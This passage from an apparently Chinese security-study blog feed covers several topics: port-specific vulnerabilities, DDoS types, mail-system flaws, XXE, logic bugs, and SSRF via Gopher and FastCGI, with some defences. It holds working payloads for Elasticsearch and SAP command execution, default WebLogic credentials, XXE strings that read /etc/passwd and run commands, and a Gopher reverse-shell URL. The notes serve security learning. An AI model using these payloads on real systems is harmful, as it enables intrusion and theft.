直接连接就行了</p><p><strong>7001、7002 weblogic默认弱口令、反序列化</strong></p><pre><code>【登录页面】http://ip:7001/console/login/LoginForm.jsp【默认密码】weblogic Oracle@123【反序列化漏洞】http://ip:7001/_async/AsyncResponseService</code></pre><p><strong>9200、9300 ElasticSearch未授权、命令执行漏洞</strong></p><pre><code>【未授权】http://localhost:9200/rvier/search 查看敏感信息了 http://localhost:9200/_plugin/head/ web管理界面 http://localhost:9200/_cat/indices 查看所有的index http://localhost:9200/river/search 查看数据库敏感信息 http://localhost:9200/_nodes 查看节点数据【命令执行】POST /_search?pretty HTTP/1.1&#123;    &quot;size&quot;: 1,    &quot;query&quot;: &#123;      &quot;filtered&quot;: &#123;        &quot;query&quot;: &#123;          &quot;match_all&quot;: &#123;          &#125;        &#125;      &#125;    &#125;,    &quot;script_fields&quot;: &#123;        &quot;command&quot;: &#123;            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;        &#125;    &#125;&#125;    &#125;&#125;</code></pre><p><strong>11211 memcache未授权访问</strong><br><code>telnet ip port</code> 直接连接</p><p><strong>50000 SAP命令执行</strong></p><pre><code>https://XXX/ctc/servlet/ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=id</code></pre><p><strong>50070、50030 hadoop默认端口未授权访问</strong></p><pre><code>http://ip:port/cluster后续上传文件反弹shell利用</code></pre><h4 id="常见的端口漏洞"><a href="#常见的端口漏洞" class="headerlink" title="常见的端口漏洞"></a>常见的端口漏洞</h4><table><thead><tr><th>端口</th><th>服务</th><th>描述</th></tr></thead><tbody><tr><td>21</td><td>ftp</td><td>FTP服务端，存在匿名未授权访问和爆破风险</td></tr><tr><td>22</td><td>ssh</td><td>SSH服务端，存在root密码爆破和后门用户的风险</td></tr><tr><td>23</td><td>telnet</td><td>Telnet服务端，常见于路由器、交换机和嵌入式设备，存在弱口令风险</td></tr><tr><td>25</td><td>smtp</td><td>SMTP服务端，可能存在默认用户和默认密码，需要防止邮件账号爆破</td></tr><tr><td>80</td><td>http</td><td>HTTP Web服务，常见的漏洞包括中间件反序列化、FastCGI配置不当等</td></tr><tr><td>110</td><td>pop3</td><td>POP3服务端，可能存在默认用户和默认密码，需要防止邮件账号爆破</td></tr><tr><td>443</td><td>https</td><td>HTTPS服务端，可能受影响的漏洞包括OpenSSL的心脏滴血和SSL/TLS低版本漏洞</td></tr><tr><td>135</td><td>netbios smb</td><td>NetBIOS SMB服务，可能受到MS17010漏洞的威胁</td></tr><tr><td>139</td><td>netbios smb</td><td>NetBIOS SMB服务，可能受到MS17010漏洞的威胁</td></tr><tr><td>445</td><td>netbios smb</td><td>NetBIOS SMB服务，可能受到MS17010漏洞的威胁</td></tr><tr><td>3389</td><td>RDP</td><td>RDP服务，可能受CVE-2019-0708漏洞的影响</td></tr></tbody></table><h4 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h4><table><thead><tr><th>端口</th><th>对应的服务</th><th>存在的相关漏洞</th></tr></thead><tbody><tr><td>21/69</td><td>ftp/tftp：文件传输协议</td><td>爆破,嗅探溢出,后门,匿名访问</td></tr><tr><td>22</td><td>ssh</td><td>爆破,openssh漏洞</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>弱口令,未授权访问,邮件伪造</td></tr><tr><td>53</td><td>dns：域名系统</td><td>dns区域传输,劫持,缓存投毒,隧道技术刺透防火墙</td></tr><tr><td>80/8080</td><td>apache/tomcat/nginx/axis2</td><td>爆破弱口令,http慢速攻击,解析漏洞</td></tr><tr><td>80/443/8080</td><td>web</td><td>常见web攻击,控制台爆破,对应服务器版本漏洞</td></tr><tr><td>80/81/443</td><td>IIS</td><td>put写文件,短文件名漏洞,解析漏洞</td></tr><tr><td>110</td><td>pop3</td><td>弱口令</td></tr><tr><td>123</td><td>ntp</td><td>ntp放大攻击</td></tr><tr><td>137/139</td><td>samba</td><td>爆破,未授权访问,远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>弱口令</td></tr><tr><td>1521</td><td>oracle</td><td>爆破注入攻击</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ladp</td><td>注入攻击,未授权访问,爆破</td></tr><tr><td>443</td><td>https</td><td>心脏滴血</td></tr><tr><td>445</td><td>smb</td><td>溢出漏洞</td></tr><tr><td>512</td><td>linux r</td><td>rlogin远程登录</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破:进行内网渗透</td></tr><tr><td>1098</td><td>javarmi</td><td>命令执行</td></tr><tr><td>1352</td><td>lotus</td><td>爆破信息泄露跨站脚本攻击</td></tr><tr><td>1433</td><td>mssql</td><td>爆破,注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>未授权访问</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>2222</td><td>da</td><td>da虚拟主机</td></tr><tr><td>2601</td><td>zebra</td><td>默认密码</td></tr><tr><td>3128</td><td>squid</td><td>空口令</td></tr><tr><td>3306</td><td>mysql</td><td>漏洞：爆破,拒绝服务,注入</td></tr><tr><td>3389</td><td>rdp/windows远程连接</td><td>爆破,shift后门,3389漏洞攻击</td></tr><tr><td>4100</td><td>sysbase</td><td>弱口令</td></tr><tr><td>4440</td><td>rundeck</td><td>弱口令</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破认证绕过</td></tr><tr><td>5000</td><td>sybase/db2</td><td>弱口令命令,注入</td></tr><tr><td>5422</td><td>postgresql</td><td>弱口令</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出,注入攻击,爆破</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务,代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破,认证口令绕过,拒绝服务攻击,权限提升</td></tr><tr><td>5984</td><td>couchdb</td><td>命令执行</td></tr><tr><td>6082</td><td>varnish</td><td>未授权访问</td></tr><tr><td>6379</td><td>redis</td><td>弱口令,未授权访问</td></tr><tr><td>7001</td><td>weblofic</td><td>爆破,弱口令(system/system,weblogic/weblogic),congsole后台部署webshell,java反序列化泄漏源代码/列目录,ssrf窥探内网,命令执行</td></tr><tr><td>8000</td><td>jdwp</td><td>命令执行</td></tr><tr><td>8069</td><td>zabbix</td><td>命令执行</td></tr><tr><td>8080</td><td>apache/tomcat/nginx/axis2/jboss中间件</td><td>弱口令命令执行</td></tr><tr><td>8080</td><td>jboss,其他端口：1098/1099/4444/4445/8080/8009/8083/8093</td><td>爆破,远程代码执行,java反序列化</td></tr><tr><td>8080</td><td>glassfish,其他端口：iiop：3700；控制台：4848</td><td>爆破,任意文件读取,认证绕过</td></tr><tr><td>8080</td><td>resin</td><td>目录遍历,远程代码执行</td></tr><tr><td>8080/8089</td><td>jenkis</td><td>爆破,未授权访问,反序列化</td></tr><tr><td>8080</td><td>jetty</td><td>远程共享,缓冲区溢出</td></tr><tr><td>8161</td><td>activemq</td><td>文件上传</td></tr><tr><td>8649</td><td>ganglia</td><td>未授权访问,信息泄露</td></tr><tr><td>8980</td><td>opennms</td><td>反序列化漏洞</td></tr><tr><td>9080</td><td>websphere</td><td>弱口令,反序列化,文件泄露</td></tr><tr><td>9090</td><td>websphere</td><td>控制台爆破,反序列化java</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行,未授权访问</td></tr><tr><td>11211</td><td>memcache</td><td>未授权访问</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破,未授权</td></tr><tr><td>27018</td><td>mongodb</td><td>未授权</td></tr><tr><td>50000</td><td>sap</td><td>命令执行</td></tr><tr><td>50010</td><td>hadoop</td><td>信息泄露命令执行</td></tr><tr><td>50030</td><td>hadoop</td><td>未授权访问</td></tr><tr><td>50070</td><td>hadoop</td><td>未授权访问</td></tr><tr><td>512/513/514</td><td>linux r</td><td>直接使用rlogin</td></tr><tr><td>67/68</td><td>dhcp</td><td>劫持欺骗</td></tr></tbody></table><p><strong>注意：端口可能会被更改或隐藏以达到防御目的</strong><br><strong>这个时候就需要进行端口爆破</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDOS攻击</title>
      <link href="/2023/07/11/DDOS%E6%94%BB%E5%87%BB/"/>
      <url>/2023/07/11/DDOS%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h3 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h3><p>Dos是拒绝服务式攻击。<br>一切能引起DOS行为的攻击都被称为Dos攻击。<br>该攻击的效果是使得计算机或网络无法提供正常的服务。</p><h4 id="SYN洪水攻击（SYN-flood）"><a href="#SYN洪水攻击（SYN-flood）" class="headerlink" title="SYN洪水攻击（SYN flood）"></a>SYN洪水攻击（SYN flood）</h4><p>SYN洪水攻击属于DoS攻击的一种<br>它利用TCP协议缺陷，通过发送大量的半连接请求，耗费目标服务的CPU和内存资源。<br>对于TCP连接而言，当服务器接收到连接请求(SYN=i )时，则将此信息加入未连接队列，并发送请求包给客户端( SYN=j,ACK=i+1 )，此时进入SYN RECV状态。当服务器未收到客户端的确认包时，重发请求包，一直到超时才将此条目从未连接队列删除。<br><strong>攻击的方式:</strong></p><ol><li>利用特殊的程序，设置TCP的Header，向服务器源源不断的发送只有SYN标志的TCP连接请求</li><li>服务器接收并为这些请求建立会话，并把它们全部加入未连接队列中并等待客户的确认</li><li>由于源地址是不存在的，服务器需要不断的重发直至超时<br>这些伪造的SYN包将长时间占用未连接队列，而正常的SYN 请求被丢弃，那么服务器就不能接收其他正常用户的请求了。<br>而且SYN攻击除了能影响主机外，还可以危害路由器、防火墙等网络系统，事实上SYN攻击并不管目标是什么系统，<strong>只要这些系统打开TCP服务就可以实施。</strong></li></ol><h4 id="DNS欺骗式攻击"><a href="#DNS欺骗式攻击" class="headerlink" title="DNS欺骗式攻击"></a>DNS欺骗式攻击</h4><p>攻击者先执行利用型攻击（如缓冲区溢出、特洛伊木马等）侵入DNS服务器的高速缓存并将不同的域名映射到被攻击目标的IP。<br>若此时用户发出一个域名解析请求，那么得到的就是被攻击者的IP，被攻击目标会收到大量的网页连接报文，造成DDOS攻击。</p><h4 id="DNS反弹式攻击（放大攻击）"><a href="#DNS反弹式攻击（放大攻击）" class="headerlink" title="DNS反弹式攻击（放大攻击）"></a>DNS反弹式攻击（放大攻击）</h4><p>攻击者发送源IP为被攻击目标IP的查询报文到大量开放的DNS服务器，DNS服务器把相应的应答报文发送到被攻击目标形成DDOS攻击。<br><strong>原理：</strong><br>域名服务器对特定的查询报文返回应答报文可超过512字节，所以一个64字节的DNS查询报文就可产生一个大于4000字节的响应报文<br>由于以太网MTU限制，被分为3个IP包在网络中传输，流量的放大比率近1:73。</p><h4 id="ICMP-Flood（死亡Ping）"><a href="#ICMP-Flood（死亡Ping）" class="headerlink" title="ICMP Flood（死亡Ping）"></a>ICMP Flood（死亡Ping）</h4><p>在短时间内向目的主机发送大量的ping的echo报文，主机不断响应，造成网络堵塞，主机资源耗尽。<br>尽管某些 ping 数据包非常小，但 IPv4 ping 数据包要大得多，并且可以达到 65,535 字节的最大允许数据包大小。<br>某些 TCP/IP 系统从未设计用于处理大于最大值的数据包，从而使其容易受到大于该大小的数据包的攻击。<br>当恶意大数据包从攻击者传输到该目标时，该数据包将分成多个分段，每个分段均低于最大大小限制。<br>当目标计算机尝试将这些部分一起放回时，总数超出大小限制，并且可能发生缓冲区溢出，从而导致目标计算机冻结、崩溃或重启。</p><h4 id="UDP-Flood"><a href="#UDP-Flood" class="headerlink" title="UDP Flood"></a>UDP Flood</h4><p>UDP协议是一种无连接的服务，在UDP FLOOD攻击中，攻击者可发送大量伪造源IP地址的小UDP包冲击服务器。<br>正常应用情况下，UDP包双向流量会基本相等，而且大小和内容都是随机的，变化很大。<br>出现UDP Flood的情况下，针对同一目标IP的UDP包在一侧大量出现，并且内容和大小都比较固定。</p><h4 id="IP-Flood"><a href="#IP-Flood" class="headerlink" title="IP Flood"></a>IP Flood</h4><p>这种攻击利用TC0协议栈的RST位来实现<br>假设有有个合法的用法(1.1.1.1)已经与服务器建立了连接，攻击者构造攻击的TCP数据，伪装自己的ip为1.1.1.1，并向服务器发送有一个带有RST位的TCP数据段<br>服务器接收到这样的数据后，认为从1.1.1.1发送的连接有错误，就会清空缓冲区中已经建立好的连接<br>这时合法用户1.1.1.1再发送合法数据，服务器就已经没有这样的连接了，该用户就被拒绝服务而只能重新开始建立新的连接。</p><h4 id="Teardrop泪滴攻击"><a href="#Teardrop泪滴攻击" class="headerlink" title="Teardrop泪滴攻击"></a>Teardrop泪滴攻击</h4><p>Teardrop攻击是一种拒绝服务攻击，是一种针对IP协议的攻击方法<br>当“13位分片偏移”字段设置成错误的值(既可与上一分片数据重叠，也可错开)<br>服务端在组合这种含有重叠偏移的伪造分片报文时，end-offset会溢出，产生一个非常大的数<br>这部分溢出数据可能会覆盖系统内存的重要内存，甚至导致系统的崩溃等。</p><h4 id="反射攻击"><a href="#反射攻击" class="headerlink" title="反射攻击"></a>反射攻击</h4><p>将源ip设置为目标ip并向大量服务器发送可返回数据请求</p><h4 id="FIN-RST-Flood攻击"><a href="#FIN-RST-Flood攻击" class="headerlink" title="FIN/RST Flood攻击"></a>FIN/RST Flood攻击</h4><p>TCP交互过程中FIN报文用来正常关闭TCP连接，RST报文用来异常断开TCP连接。<br>当使用伪造ip向服务器发送RST数据包而且ip正好是用户ip时，用户的链接被中断。</p><h4 id="HTTP攻击（CC攻击）"><a href="#HTTP攻击（CC攻击）" class="headerlink" title="HTTP攻击（CC攻击）"></a>HTTP攻击（CC攻击）</h4><p><code>Challenge Collapsar</code>攻击是针对Web服务在第七层协议（应用层）发起的攻击<br>一般的攻击者会选择搜索之类需要做大量数据查询的页面作为攻击目标，可以消耗服务器尽可能多的资源。<br>攻击时尽量选择正常用户也通过APP访问的页面，一般来说就是各种Web API。<br>正常用户和恶意流量都是来源于APP，人机差别很小，基本融为一体难以区分。<br>但是由于HTTP协议实际上是基于tcp协议的，需要三次握手，所以不能伪造ip</p><h4 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h4><ol><li>使用工具根据IP地址的路径逻辑检测出矛盾，从而判断是否是正常流量</li><li>CDN、高防、负载均衡、分布式集群防御</li><li>限制特定流量：检查访问来源做适当限制</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>邮件系统漏洞攻击</title>
      <link href="/2023/07/10/%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/"/>
      <url>/2023/07/10/%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>漏洞攻击是危害网络安全中较为常见的一种。<br>不同应用程序彼此之间的相互作用，如大多数程序必须与其它API相交互，保存并检索文件，同时运行在多种不同类型的设备上，都会可能产生漏洞；<br>又如互联网通信协议—TCP和UDP，其开放性常常引来黑客的攻击；而IP地址的脆弱性，也给黑客的伪造提供了可能，从而泄露远程服务器的资源信息。</p><h4 id="危害-漏洞利用"><a href="#危害-漏洞利用" class="headerlink" title="危害/漏洞利用"></a>危害/漏洞利用</h4><p><strong>一、IMAP 和 POP 漏洞：</strong><br>这些协议常见弱点是密码脆弱，同时，各种IMAP和POP服务还容易受到如缓冲区溢出等类型的攻击。</p><p><strong>二、拒绝服务（DoS）攻击：</strong><br>1.死亡Ping——发送一个无效数据片段，该片段始于包结尾之前，但止于包结尾之后；<br>2.同步攻击——极快地发送TCP SYN包（它会启动连接），使受攻击的机器耗尽系统资源，进而中断合法连接；<br>3.循环——发送一个带有完全相同的源／目的地址／端口的伪造SYN包，使系统陷入一个试图完成TCP连接的无限循环中。<br><strong>DDOS攻击的相关内容后面再写</strong></p><p><strong>三、系统配置漏洞：</strong><br>1.默认配置——大多数系统在交付给客户时都设置了易于使用的默认配置，被黑客盗用变得轻松；2.空的／默认根密码——许多机器都配置了空的或默认的根／管理员密码，并且其数量多得惊人；<br>3.漏洞创建——几乎所有程序都可以配置为在不安全模式下运行，这会在系统上留下不必要的漏洞。</p><p><strong>四、利用软件问题：</strong><br>在服务器守护程序、客户端应用程序、操作系统和网络堆栈中，存在很多的软件错误，分为以下几类：<br>1.缓冲区溢出——程序员会留出一定数目的字符空间来容纳登录用户名，黑客则会通过发送比指定字符串长的字符串，其中包括服务器要执行的代码，使之发生数据溢出，造成系统入侵。<br>2.意外组合——程序通常是用很多层代码构造而成的，入侵者可能会经常发送一些对于某一层毫无意义，但经过适当构造后对其他层有意义的输入。<br>3.未处理的输入——大多数程序员都不考虑输入不符合规范的信息时会发生什么。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE（XML外部实体注入）</title>
      <link href="/2023/07/09/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/"/>
      <url>/2023/07/09/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h4 id="了解XML"><a href="#了解XML" class="headerlink" title="了解XML"></a>了解XML</h4><p>XML 是一种标记语言，很类似于 HTML<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息<br>因此我们需要编写软件或者程序，才能传送、接收和显示出这个文档。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>XXE是针对解析XML输入的应用程序的一种攻击。<br>当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。</p><h4 id="常见漏洞存在点"><a href="#常见漏洞存在点" class="headerlink" title="常见漏洞存在点"></a>常见漏洞存在点</h4><p>可解析xml的api接口</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>内网端口扫描</li><li>利用file协议等读取文件</li><li>攻击内网web应用使用</li><li>get(struts2等)</li></ol><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ol><li>导致可以加载恶意外部文件</li><li>造成文件读取（信息泄露、SSRF）<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre></li><li>内网端口扫描<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;http://192.168.31.124:4444/test&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;&lt;/r&gt;</code></pre></li><li>攻击内网网站（命令执行）<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;except://id&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></pre></li><li>发起dos攻击等危害（拒绝服务）</li></ol><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ol><li>过滤用户提交的XML数据</li><li>将PHP程序的libxml_disable_entity_loader设置为TRUE来禁用外部实体</li><li>java如下更改配置<pre><code>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</code></pre></li><li>python如下配置<pre><code>from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre></li></ol><h4 id="CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h4><p><a href="https://smms.app/image/mKHhc1M6lY5OjnD" target="_blank"><img src="https://s2.loli.net/2023/07/19/mKHhc1M6lY5OjnD.png" ></a></p><p><code>XSS</code> 是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。<br>修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p><p><code>CSRF</code> 是跨站请求伪造攻击，没有在关键操作执行时进行是否由用户自愿发起的确认。<br>修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer.</p><p><code>XXE</code> 是XML中可以通过调用实体来请求本地或者远程内容<br>修复方式：XML解析库在调用时严格禁止对外部实体的解析</p>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞</title>
      <link href="/2023/07/09/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/07/09/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p><a href="https://smms.app/image/XQtTYJOM86jfR1K" target="_blank"><img src="https://s2.loli.net/2023/07/09/XQtTYJOM86jfR1K.png" ></a></p><h4 id="常见的逻辑漏洞"><a href="#常见的逻辑漏洞" class="headerlink" title="常见的逻辑漏洞"></a>常见的逻辑漏洞</h4><h5 id="订单任意金额修改"><a href="#订单任意金额修改" class="headerlink" title="订单任意金额修改"></a>订单任意金额修改</h5><p>相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数。<br><strong>预防思路：</strong></p><ul><li>订单需要多重效验</li><li>订单数值较大的时候需要人工审核<h5 id="验证码回传"><a href="#验证码回传" class="headerlink" title="验证码回传"></a>验证码回传</h5>该类型漏洞一般发生在账号密码找回、账号注册、支付订单等。验证码发送途径一般为手机短信、邮箱邮件</li></ul><p><strong>预防思路：</strong></p><ul><li>验证码不要放在数据包内，而是在后端验证，缺点是服务器的运算压力也会随之增加</li><li>如果要进行前端验证的话也可以，但是需要进行加密<h5 id="未进行登陆凭证验证"><a href="#未进行登陆凭证验证" class="headerlink" title="未进行登陆凭证验证"></a>未进行登陆凭证验证</h5>有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未<br>经授权访问这些敏感信息甚至是越权操作。比如后台页面、订单ID枚举、敏感信息可下载、没<br>验证ID或cookie验证导致越权。</li></ul><p><strong>预防思路：</strong></p><ul><li>对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证<h5 id="接口无限制枚举"><a href="#接口无限制枚举" class="headerlink" title="接口无限制枚举"></a>接口无限制枚举</h5></li></ul><p><strong>漏洞点：</strong></p><ul><li>某电商登陆接口无验证导致撞库</li><li>某招聘网验证码无限制枚举</li><li>某快递公司优惠券枚举</li><li>某电商会员卡卡号枚举</li></ul><p><strong>预防思路：</strong></p><ul><li>在输入接口设置验证，如token，验证码，并使用后端验证。</li><li>注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。</li><li>验证码尽量使用6位以上字母加数字进行组合，并且设定较短时间期限。</li><li>号码尽量不要存在规律性和简短性<h5 id="cookie设置存在缺陷"><a href="#cookie设置存在缺陷" class="headerlink" title="cookie设置存在缺陷"></a>cookie设置存在缺陷</h5></li></ul><p><strong>漏洞点：</strong></p><ul><li>Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单</li><li>cookie存在被盗风险，即用户重置密码后使用老cookie依然可以通过验证</li><li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。不能采取简单的base64等算法</li><li>越权：平行越权：权限类型不变，权限ID改变；垂直越权：权限ID不变，权限类型改变；交叉越权：即改变ID，也改变权限</li></ul><p><strong>预防思路：</strong></p><ul><li>cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才<br>能返回数据。</li><li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。</li><li>用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。</li><li>cookie中设定session参数，以防cookie可以长时间生效。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>协议拓展</title>
      <link href="/2023/07/08/%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95/"/>
      <url>/2023/07/08/%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>在WWW出现之前，Gopher是Internet上最主要的信息检索工具<br>GOPHER协议是一种比HTTP协议还要古老的协议，默认工作端口70<br>GOPHER协议可以以单个URL的形式传递POST请求，同时支持换行（能换行就有很大操作空间）</p><h4 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h4><pre><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流注意要有一个_，这个符号可以换成任意一个字符</code></pre><h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><p>准备好请求数据</p><pre><code>GET /testg.php?name=xxx HTTP/1.1Host: 10.211.55.2</code></pre><p>用BP全编码</p><pre><code>%47%45%54%20%2f%74%......</code></pre><p>加上格式</p><pre><code>gopher://10.211.55.2:80/_%47%45%54%20%2f%74%......</code></pre><p><em><strong>编码的时候在最后一定要补%0d%0a代表结束<br>问号需要转码为URL编码，也就是%3f</strong></em></p><h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><p>准备好请求数据</p><pre><code>POST /testg.php HTTP/1.1Host: 10.211.55.2Content-Type: application/x-www-form-urlencodedContent-Length: 8 name=xxx</code></pre><p>用BP全编码</p><pre><code>%50%4f%53%54%20%2f%74%65%73%7......</code></pre><p>加上格式</p><pre><code>gopher://10.211.55.2:80/_%50%4f%53%54%20%2f%74%65%73%7......</code></pre><p><em><strong>编码的时候在最后一定要补%0d%0a代表结束<br>问号需要转码为URL编码，也就是%3f</strong></em></p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>协议可以几乎无限制地传输各种数据</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>反弹shell</p><pre><code>http://192.168.0.109/ssrf/base/curl_exec.php?url=gopher://192.168.0.119:6666/_abc</code></pre><p><a href="https://gitcode.net/mirrors/tarunkant/Gopherus?utm_source=csdn_github_accelerator">监测及RCE工具</a></p><h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>FastCGI协议和HTTP协议一样是通信协议<br>http是浏览器（也就是客户端）和服务器中间件之间通信的协议，而FastCGI协议是服务器中间件和某种语言编写的正在运行的后端程序间的通信协议。<br>它支持分布式的运算，所以 FastCGI 程序可以在网站服务器以外的主机上执行，并且可以接受来自其它网站服务器的请求<br>FastCGI将CGI解释器进程保持在内存中，以此获得较高的性能</p><h4 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h4><p><a href="https://smms.app/image/oWEr76O4A5hLaJj" target="_blank"><img src="https://s2.loli.net/2023/07/08/oWEr76O4A5hLaJj.png" ></a></p><h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>PHP-FPM（fastcgi进程管理器）默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>需要一个php文件，首选/var/www/html/index.php</li><li>然后要在PHP.INI中打开配置项auto_prepend_file和auto_append_file</li><li>接着使用上面说的那个Gopherus工具生成payload</li><li>根据配置文件Web Server辨别不是静态文件，此时就需要去找 PHP解析器来处理</li><li>Web Server收到 index.php 这个请求后，会启动对应的CGI 程序，也就是PHP解析器</li><li>PHP解析器会解析php.ini文件，然后就执行完一整个工作流程返回数据</li></ol><h3 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h3><h4 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h4><p>redis是一个key-value存储系统<br>它对数据支持复杂的操作、支持各种不同方式的排序、为了保证效率数据缓存在内存中<br>redis数据库一种，默认绑定在0.0.0.0:6379，攻击者直接可以访问到<br>默认无密码，登录账户为root</p><h4 id="存在漏洞"><a href="#存在漏洞" class="headerlink" 